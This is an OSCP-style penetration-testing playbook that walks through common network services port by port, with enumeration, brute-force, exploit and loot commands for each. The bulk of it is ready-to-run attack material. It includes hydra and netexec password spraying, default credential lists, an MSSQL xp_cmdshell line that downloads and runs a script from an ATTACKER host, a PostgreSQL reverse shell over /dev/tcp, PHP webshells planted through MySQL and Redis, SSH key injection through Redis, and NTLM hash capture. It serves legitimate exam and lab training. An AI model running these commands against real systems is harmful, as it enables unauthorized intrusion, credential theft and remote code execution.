# Attacking Common Services — OSCP Playbook

Port-by-port reference for enumerating and exploiting every network service you will encounter on the OSCP. Each service follows the same flow: **Detect → Enumerate → Brute Force → Exploit → Loot**.

---

## Table of Contents

- [21 — FTP](#21--ftp)
- [22 — SSH](#22--ssh)
- [23 — Telnet](#23--telnet)
- [25 / 587 — SMTP](#25--587--smtp)
- [53 — DNS](#53--dns)
- [80 / 443 — HTTP/HTTPS](#80--443--httphttps)
- [88 — Kerberos](#88--kerberos)
- [110 / 143 — POP3 / IMAP](#110--143--pop3--imap)
- [111 / 2049 — NFS](#111--2049--nfs)
- [135 / 593 — MSRPC](#135--593--msrpc)
- [139 / 445 — SMB](#139--445--smb)
- [161 / 162 — SNMP](#161--162--snmp)
- [389 / 636 — LDAP](#389--636--ldap)
- [1433 — MSSQL](#1433--mssql)
- [3306 — MySQL](#3306--mysql)
- [3389 — RDP](#3389--rdp)
- [5432 — PostgreSQL](#5432--postgresql)
- [5985 / 5986 — WinRM](#5985--5986--winrm)
- [6379 — Redis](#6379--redis)

---

## 21 — FTP

### Enumerate

```bash
nmap -sV -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor TARGET
```

### Anonymous Login

```bash
ftp TARGET
# user: anonymous
# pass: (blank or anything)

ftp> ls -la                 # check for hidden files
ftp> binary                 # switch to binary before downloading
ftp> mget *                 # download everything
ftp> put test.txt           # check write access
```

### Brute Force

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://TARGET
hydra -L users.txt -P passwords.txt ftp://TARGET
netexec ftp TARGET -u users.txt -p passwords.txt
```

### Exploits

```bash
# vsFTPd 2.3.4 backdoor (Metasploit or manual — port 6200 shell)
nmap --script ftp-vsftpd-backdoor -p 21 TARGET
# Trigger: login with username ending in :)
# Then: nc TARGET 6200

# ProFTPd 1.3.5 mod_copy (unauthenticated file copy)
nc TARGET 21
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/passwd.txt
# Now read: http://TARGET/passwd.txt

# FTP Bounce scan (pivot through FTP to scan internal hosts)
nmap -Pn -b anonymous@TARGET INTERNAL_IP
```

### Loot

```bash
# Download everything and search for creds
grep -riE 'password|passwd|secret|key|token' *
find . -name "*.conf" -o -name "*.cfg" -o -name "*.ini" -o -name "*.bak"
```

---

## 22 — SSH

### Enumerate

```bash
nmap -sV -p 22 --script ssh2-enum-algos,ssh-hostkey,ssh-auth-methods TARGET

# Banner grab (version info)
nc -nv TARGET 22
```

### Brute Force

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET
hydra -L users.txt -P passwords.txt ssh://TARGET -t 4

netexec ssh TARGET -u users.txt -p passwords.txt
```

### Login with Keys

```bash
# If you found a private key
chmod 600 id_rsa
ssh -i id_rsa user@TARGET

# If key is passphrase protected
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Exploits

```bash
# OpenSSH < 7.7 Username Enumeration (CVE-2018-15473)
python3 ssh_user_enum.py TARGET -u root
python3 ssh_user_enum.py TARGET --userlist users.txt

# libssh auth bypass (CVE-2018-10933) — rare but instant access
python3 libssh_bypass.py TARGET
```

### Post-Login

```bash
# Grab user info
id; whoami; hostname; ip a
sudo -l                     # check sudo permissions
cat ~/.bash_history          # command history
cat ~/.ssh/authorized_keys   # who else has access
ls -la /home/                # other users
find / -perm -4000 2>/dev/null   # SUID binaries
```

---

## 23 — Telnet

### Enumerate

```bash
nmap -sV -p 23 --script telnet-ntlm-info TARGET
# Banner often leaks OS info
```

### Connect

```bash
telnet TARGET
# Or
nc -nv TARGET 23
```

### Brute Force

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://TARGET
```

---

## 25 / 587 — SMTP

### Enumerate

```bash
nmap -sV -p 25,465,587 --script smtp-commands,smtp-enum-users,smtp-open-relay TARGET
```

### User Enumeration

```bash
# VRFY — verify if a user exists
nc -nv TARGET 25
HELO test
VRFY root
VRFY admin
VRFY www-data

# EXPN — expand a mailing list
EXPN admin

# RCPT TO — another enumeration method
MAIL FROM:<test@test.com>
RCPT TO:<admin@TARGET>        # 250 = exists, 550 = doesn't

# Automated
smtp-user-enum -M VRFY -U users.txt -t TARGET
smtp-user-enum -M RCPT -U users.txt -t TARGET -D target.htb
```

### Send Mail (Phishing / Log Poisoning)

```bash
# Craft and send email via SMTP
swaks --to user@TARGET --from attacker@evil.com \
  --header "Subject: Important" \
  --body "Click here" \
  --server TARGET --port 25

# With attachment
swaks --to user@TARGET --from it@TARGET \
  --attach malicious.docx \
  --server TARGET
```

### Open Relay Check

```bash
# If you can relay mail through the server to external addresses
nmap --script smtp-open-relay -p 25 TARGET

# Manual check
nc TARGET 25
HELO test
MAIL FROM:<attacker@evil.com>
RCPT TO:<attacker@evil.com>     # external address
DATA
Test
.
# 250 = open relay
```

---

## 53 — DNS

### Enumerate

```bash
nmap -sV -p 53 --script dns-nsid TARGET

# Zone transfer (dumps ALL records)
dig axfr @TARGET target.htb
dig axfr @TARGET

# Host lookup
dig @TARGET target.htb any
dig @TARGET target.htb A
dig @TARGET target.htb MX
dig @TARGET target.htb TXT
dig @TARGET target.htb NS

# Reverse lookup
dig @TARGET -x 10.10.10.5

# Brute force subdomains
dnsenum --nameserver TARGET --enum target.htb
dnsrecon -d target.htb -n TARGET -t axfr
gobuster dns -d target.htb -r TARGET:53 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

### Always Try

```bash
# Add domain to /etc/hosts first
echo "TARGET_IP target.htb" >> /etc/hosts

# Zone transfer is the #1 DNS attack
dig axfr @TARGET target.htb
# If it works you get all subdomains → add them to /etc/hosts → enumerate each
```

---

## 80 / 443 — HTTP/HTTPS

### Enumerate

```bash
# Technology fingerprint
whatweb http://TARGET
curl -sI http://TARGET

# Directory brute force
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak
feroxbuster -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Vhost enumeration
gobuster vhost -u http://TARGET -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
ffuf -u http://TARGET -H "Host: FUZZ.target.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs SIZE_OF_DEFAULT

# Nikto vulnerability scan
nikto -h http://TARGET

# Check for robots.txt, sitemap.xml
curl http://TARGET/robots.txt
curl http://TARGET/sitemap.xml

# SSL/TLS info
sslscan TARGET:443
nmap --script ssl-enum-ciphers -p 443 TARGET

# Screenshot (multi-target recon)
gowitness single http://TARGET
```

### Check For

```bash
# CMS → see CMS Playbook
# File uploads → see Upload Attacks Playbook
# LFI/RFI → see LFI/RCE Playbook
# SQLi → test every parameter with '
# Command injection → test with ; id or | id
# Default creds on login pages
# Source code comments (view-source:)
# JavaScript files with API keys or endpoints
# /api/ endpoints
# Backup files: .bak, .old, .swp, ~, .save
```

---

## 88 — Kerberos

### Enumerate

```bash
nmap -sV -p 88 TARGET

# Indicates Active Directory Domain Controller
# Need domain name — check LDAP, SMB, or DNS
```

### User Enumeration (No Creds)

```bash
# Kerbrute — fast and stealthy
kerbrute userenum -d target.htb --dc TARGET /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

### AS-REP Roasting (No Creds)

```bash
# Find accounts that don't require pre-authentication
impacket-GetNPUsers target.htb/ -dc-ip TARGET -usersfile users.txt -no-pass -outputfile asrep.txt

# Crack the hashes
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
john asrep.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Kerberoasting (With Creds)

```bash
# Request service tickets for cracking
impacket-GetUserSPNs target.htb/user:password -dc-ip TARGET -outputfile kerberoast.txt

# Crack
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
john kerberoast.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## 110 / 143 — POP3 / IMAP

### Enumerate

```bash
nmap -sV -p 110,143,993,995 --script pop3-capabilities,imap-capabilities TARGET
```

### Read Mail

```bash
# POP3
nc -nv TARGET 110
USER admin
PASS password
LIST                        # list messages
RETR 1                      # read message 1

# IMAP
nc -nv TARGET 143
a1 LOGIN admin password
a2 LIST "" "*"              # list mailboxes
a3 SELECT INBOX
a4 FETCH 1 BODY[]           # read message 1
```

### Brute Force

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt pop3://TARGET
hydra -l admin -P /usr/share/wordlists/rockyou.txt imap://TARGET
```

---

## 111 / 2049 — NFS

### Enumerate

```bash
nmap -sV -p 111,2049 --script nfs-ls,nfs-showmount,nfs-statfs TARGET

# Show available shares
showmount -e TARGET
```

### Mount and Loot

```bash
# Create mount point and mount the share
mkdir /tmp/nfs
mount -t nfs TARGET:/share /tmp/nfs -o nolock

# If permission denied (UID mismatch), create a user with the right UID
# Check required UID:
ls -lan /tmp/nfs
# If files owned by UID 1001:
useradd -u 1001 nfsuser
su nfsuser
cat /tmp/nfs/sensitive_file

# Look for SSH keys, configs, backups
find /tmp/nfs -type f -name "*.txt" -o -name "*.conf" -o -name "id_rsa" -o -name "*.bak"

# Unmount when done
umount /tmp/nfs
```

### NFS Privesc (no_root_squash)

```bash
# If share is exported with no_root_squash, root on client = root on share
# Check:
cat /etc/exports   # on target, if you have shell

# Exploit: place a SUID binary
cp /bin/bash /tmp/nfs/rootbash
chmod +s /tmp/nfs/rootbash
# On target:
/share/rootbash -p    # root shell
```

---

## 135 / 593 — MSRPC

### Enumerate

```bash
nmap -sV -p 135,593 --script msrpc-enum TARGET

# Enumerate RPC endpoints
rpcclient -U "" -N TARGET
rpcclient> enumdomusers           # list domain users
rpcclient> enumdomgroups          # list domain groups
rpcclient> querydominfo           # domain info
rpcclient> querydispinfo          # detailed user info
rpcclient> queryuser 0x1f4       # RID 500 = Administrator
rpcclient> enumprinters           # list printers

# IOXIDResolver — get network interfaces (no auth)
impacket-IOXIDResolver TARGET
```

---

## 139 / 445 — SMB

### Enumerate

```bash
# Comprehensive nmap scan
nmap -sV -p 139,445 --script smb-enum-shares,smb-enum-users,smb-os-discovery,smb-protocols,smb-security-mode,smb-vuln* TARGET

# Enum4linux
enum4linux -a TARGET

# netexec (formerly crackmapexec)
netexec smb TARGET --shares
netexec smb TARGET --shares -u '' -p ''       # null session
netexec smb TARGET --shares -u 'guest' -p ''  # guest session
netexec smb TARGET --users
netexec smb TARGET --groups

# smbclient
smbclient -L //TARGET -N                       # null session list
smbclient -L //TARGET -U username%password

# smbmap
smbmap -H TARGET
smbmap -H TARGET -u null
smbmap -H TARGET -u guest
smbmap -H TARGET -u user -p password
smbmap -H TARGET -u user -p password -R       # recursive listing
```

### Connect to Shares

```bash
# Connect to a share
smbclient //TARGET/sharename -N                # null
smbclient //TARGET/sharename -U username%password

# Useful commands inside
smb> ls
smb> cd directory
smb> get filename
smb> mget *                # download all
smb> put local_file        # upload
smb> recurse ON; prompt OFF; mget *    # download everything recursively
```

### Brute Force

```bash
netexec smb TARGET -u users.txt -p passwords.txt
netexec smb TARGET -u users.txt -p passwords.txt --continue-on-success
hydra -L users.txt -P passwords.txt smb://TARGET
```

### Exploits

```bash
# EternalBlue (MS17-010) — Windows 7/2008R2/2012 unauthenticated RCE
nmap --script smb-vuln-ms17-010 -p 445 TARGET
# Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS TARGET
set LHOST ATTACKER
run

# MS08-067 (Windows XP/2003)
use exploit/windows/smb/ms08_067_netapi

# SambaCry (CVE-2017-7494) — Linux Samba writable share → RCE
use exploit/linux/samba/is_known_pipename
```

### Loot

```bash
# Always download everything and search
find . -type f | while read f; do echo "=== $f ==="; strings "$f" | grep -iE 'password|secret|key|credential'; done
grep -rlE 'password|passwd|secret' .
```

---

## 161 / 162 — SNMP

### Enumerate

```bash
# Brute force community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt TARGET

# Walk the MIB tree
snmpwalk -v2c -c public TARGET
snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.25.1.6.0    # system processes
snmpwalk -v2c -c public TARGET 1.3.6.1.4.1.77.1.2.25    # user accounts
snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.25.4.2.1.2   # running processes
snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.6.13.1.3     # open TCP ports
snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.25.6.3.1.2   # installed software

# Full enumeration with snmp-check
snmp-check TARGET -c public

# Extended query
snmpwalk -v2c -c public TARGET NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```

### SNMP Goldmine (What to Look For)

```bash
# Running processes → find services, command line args with passwords
# Installed software → find vulnerable versions
# User accounts → usernames for brute force
# Network interfaces → internal IPs for pivoting
# TCP connections → internal services
# System description → exact OS version
```

---

## 389 / 636 — LDAP

### Enumerate

```bash
nmap -sV -p 389,636 --script ldap-search,ldap-rootdse TARGET

# Anonymous bind — dump everything
ldapsearch -x -H ldap://TARGET -b "dc=target,dc=htb"
ldapsearch -x -H ldap://TARGET -b "dc=target,dc=htb" "(objectClass=user)" sAMAccountName

# Get naming context (base DN)
ldapsearch -x -H ldap://TARGET -s base namingContexts

# Dump users
ldapsearch -x -H ldap://TARGET -b "dc=target,dc=htb" "(objectClass=person)" sAMAccountName description memberOf

# With credentials
ldapsearch -x -H ldap://TARGET -D "user@target.htb" -w 'password' -b "dc=target,dc=htb"
```

### Loot

```bash
# Look for passwords in description fields
ldapsearch ... "(objectClass=user)" description | grep -i pass

# Find service accounts
ldapsearch ... "(servicePrincipalName=*)" sAMAccountName servicePrincipalName

# Find accounts with "Do not require Kerberos preauthentication"
ldapsearch ... "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName
```

---

## 1433 — MSSQL

### Enumerate

```bash
nmap -sV -p 1433 --script ms-sql-info,ms-sql-config,ms-sql-ntlm-info TARGET
```

### Connect

```bash
# Impacket
impacket-mssqlclient user:password@TARGET -windows-auth
impacket-mssqlclient sa:password@TARGET

# sqsh
sqsh -S TARGET -U sa -P password
```

### Default / Common Credentials

```
sa:sa
sa:(blank)
sa:password
sa:sa123
admin:admin
```

### Brute Force

```bash
hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://TARGET
netexec mssql TARGET -u sa -p passwords.txt
```

### RCE via xp_cmdshell

```bash
# Enable xp_cmdshell
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# Execute commands
SQL> EXEC xp_cmdshell 'whoami';
SQL> EXEC xp_cmdshell 'dir C:\Users';
SQL> EXEC xp_cmdshell 'type C:\Users\Administrator\Desktop\proof.txt';

# Reverse shell
SQL> EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER/shell.ps1'')"';

# With impacket (easier)
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

### Steal NTLM Hash

```bash
# Start responder on attacker
sudo responder -I tun0

# Force MSSQL to authenticate to your SMB
SQL> EXEC xp_dirtree '\\ATTACKER\share', 1, 1;
# Responder catches the NTLMv2 hash → crack with hashcat -m 5600
```

### Loot

```bash
SQL> SELECT name FROM sys.databases;
SQL> USE database_name;
SQL> SELECT name FROM sys.tables;
SQL> SELECT * FROM users;
# Look for credentials, API keys, connection strings to other services
```

---

## 3306 — MySQL

### Enumerate

```bash
nmap -sV -p 3306 --script mysql-info,mysql-enum TARGET
```

### Connect

```bash
mysql -h TARGET -u root -p
mysql -h TARGET -u root          # no password
```

### Default / Common Credentials

```
root:(blank)
root:root
root:password
root:mysql
root:toor
admin:admin
```

### Brute Force

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://TARGET
```

### Useful Queries

```sql
-- Version
SELECT @@version;

-- Current user and privileges
SELECT user(), current_user();
SHOW GRANTS;

-- List databases and tables
SHOW DATABASES;
USE database_name;
SHOW TABLES;

-- Dump users
SELECT user,host,authentication_string FROM mysql.user;

-- Read files (needs FILE privilege)
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/wp-config.php');

-- Write files (needs FILE + writable dir)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/cmd.php';

-- Check secure_file_priv
SHOW VARIABLES LIKE 'secure_file_priv';
-- Empty = write anywhere, NULL = disabled, path = restricted
```

---

## 3389 — RDP

### Enumerate

```bash
nmap -sV -p 3389 --script rdp-enum-encryption,rdp-ntlm-info TARGET
```

### Connect

```bash
# Linux client
xfreerdp /v:TARGET /u:username /p:password /cert-ignore
xfreerdp /v:TARGET /u:username /p:password /cert-ignore +clipboard /dynamic-resolution

# With domain
xfreerdp /v:TARGET /u:username /p:password /d:target.htb /cert-ignore

# Pass the hash
xfreerdp /v:TARGET /u:Administrator /pth:NTLM_HASH /cert-ignore

# rdesktop
rdesktop -u username -p password TARGET
```

### Brute Force

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt rdp://TARGET
netexec rdp TARGET -u users.txt -p passwords.txt

# crowbar (handles NLA better)
crowbar -b rdp -s TARGET/32 -u admin -C passwords.txt
```

### Exploits

```bash
# BlueKeep (CVE-2019-0708) — Windows 7/2008 R2 unauthenticated RCE
nmap --script rdp-vuln-ms12-020 -p 3389 TARGET
# Metasploit
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

---

## 5432 — PostgreSQL

### Enumerate

```bash
nmap -sV -p 5432 --script pgsql-brute TARGET
```

### Connect

```bash
psql -h TARGET -U postgres -W
psql -h TARGET -U postgres -d template1
```

### Default Credentials

```
postgres:postgres
postgres:(blank)
postgres:password
admin:admin
```

### Brute Force

```bash
hydra -l postgres -P /usr/share/wordlists/rockyou.txt postgres://TARGET
```

### RCE via COPY FROM PROGRAM (CVE-2019-9193)

```sql
-- Requires superuser
DROP TABLE IF EXISTS cmd;
CREATE TABLE cmd(output text);
COPY cmd FROM PROGRAM 'id';
SELECT * FROM cmd;

-- Reverse shell
COPY cmd FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"';
```

### Loot

```sql
-- List databases
SELECT datname FROM pg_database;

-- List tables
SELECT tablename FROM pg_tables WHERE schemaname='public';

-- Dump users
SELECT usename, passwd FROM pg_shadow;

-- Read files
SELECT pg_read_file('/etc/passwd');

-- Check if superuser
SELECT current_setting('is_superuser');
```

---

## 5985 / 5986 — WinRM

### Enumerate

```bash
nmap -sV -p 5985,5986 TARGET
```

### Connect

```bash
# evil-winrm (best tool)
evil-winrm -i TARGET -u username -p password
evil-winrm -i TARGET -u username -H NTLM_HASH        # pass the hash
evil-winrm -i TARGET -u username -p password -s /scripts -e /executables

# netexec check
netexec winrm TARGET -u username -p password
# [+] means Pwn3d! = user is in Remote Management Users group
```

### Brute Force

```bash
netexec winrm TARGET -u users.txt -p passwords.txt
```

### Post-Login

```bash
# In evil-winrm session
*Evil-WinRM* PS> whoami /all
*Evil-WinRM* PS> net user
*Evil-WinRM* PS> upload linpeas.exe
*Evil-WinRM* PS> download C:\Users\Administrator\Desktop\proof.txt
*Evil-WinRM* PS> menu    # shows built-in commands (Bypass-4MSI, dll injection, etc.)
```

---

## 6379 — Redis

### Enumerate

```bash
nmap -sV -p 6379 --script redis-info TARGET

# Manual connect
redis-cli -h TARGET
> INFO
> CONFIG GET *
> KEYS *
> GET key_name
```

### Unauthenticated Access

```bash
redis-cli -h TARGET
> PING                    # PONG = unauthenticated access

> INFO server             # version, OS
> INFO keyspace           # databases with keys
> SELECT 0                # switch database
> KEYS *                  # all keys
> GET session:abc123      # read session data (creds, tokens)
```

### Write Webshell

```bash
redis-cli -h TARGET
> CONFIG SET dir /var/www/html
> CONFIG SET dbfilename shell.php
> SET payload "<?php system($_GET['cmd']); ?>"
> SAVE
# Visit: http://TARGET/shell.php?cmd=id
```

### Write SSH Key

```bash
# Generate key
ssh-keygen -t rsa -f redis_key

# Build payload with padding
(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > payload.txt

# Write via Redis
redis-cli -h TARGET FLUSHALL
cat payload.txt | redis-cli -h TARGET -x SET crackit
redis-cli -h TARGET CONFIG SET dir /var/lib/redis/.ssh
# Or: CONFIG SET dir /home/redis/.ssh
redis-cli -h TARGET CONFIG SET dbfilename authorized_keys
redis-cli -h TARGET SAVE

# Connect
ssh -i redis_key redis@TARGET
```

### RCE via Module Load

```bash
# Use redis-rogue-server or pg-pwn to load a malicious .so
# See the redis-rogue-pwn playbook
python3 redis-rogue-pwn.py -t TARGET -l ATTACKER -x 'id'
```

---

## Quick Reference Card

```
┌──────────┬───────────────────────────────────────────────────────┐
│ PORT     │ FIRST MOVES                                          │
├──────────┼───────────────────────────────────────────────────────┤
│ 21 FTP   │ anon login → ls -la → put test (writable?) → loot    │
│ 22 SSH   │ banner → brute (hydra/netexec) → keys if found       │
│ 25 SMTP  │ VRFY enum → smtp-user-enum → mail phish              │
│ 53 DNS   │ dig axfr (zone transfer!) → subdomain brute          │
│ 80 HTTP  │ whatweb → gobuster/ffuf → nikto → vhost enum         │
│ 88 Kerb  │ kerbrute userenum → AS-REP Roast → Kerberoast        │
│ 110 POP3 │ brute → login → read mail for creds                  │
│ 111 NFS  │ showmount -e → mount → loot → no_root_squash privesc │
│ 135 RPC  │ rpcclient -U "" → enumdomusers → queryuser           │
│ 139/445  │ enum4linux → smbclient -L → netexec --shares → loot  │
│    SMB   │ MS17-010 check → EternalBlue if vuln                  │
│ 161 SNMP │ onesixtyone brute → snmpwalk → processes/users/nets   │
│ 389 LDAP │ anonymous bind → dump users → check descriptions      │
│ 1433     │ sa brute → xp_cmdshell → NTLM steal via xp_dirtree   │
│  MSSQL   │                                                       │
│ 3306     │ root:(blank) → LOAD_FILE → INTO OUTFILE webshell      │
│  MySQL   │                                                       │
│ 3389 RDP │ brute → xfreerdp → BlueKeep if old                   │
│ 5432     │ postgres:postgres → COPY FROM PROGRAM → RCE           │
│  PgSQL   │                                                       │
│ 5985     │ netexec winrm check → evil-winrm → PtH               │
│  WinRM   │                                                       │
│ 6379     │ PING (unauth?) → write webshell/SSH key → module RCE  │
│  Redis   │                                                       │
└──────────┴───────────────────────────────────────────────────────┘

UNIVERSAL BRUTE FORCE:
  hydra -L users.txt -P passes.txt PROTOCOL://TARGET
  netexec PROTOCOL TARGET -u users.txt -p passes.txt
```

## References

- [HackTricks — Pentesting Services](https://book.hacktricks.wiki/en/network-services-pentesting/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [OSCP Cheat Sheet — sushant747](https://sushant747.gitbooks.io/total-oscp-guide/content/)
- [SecLists — Default Credentials](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials)
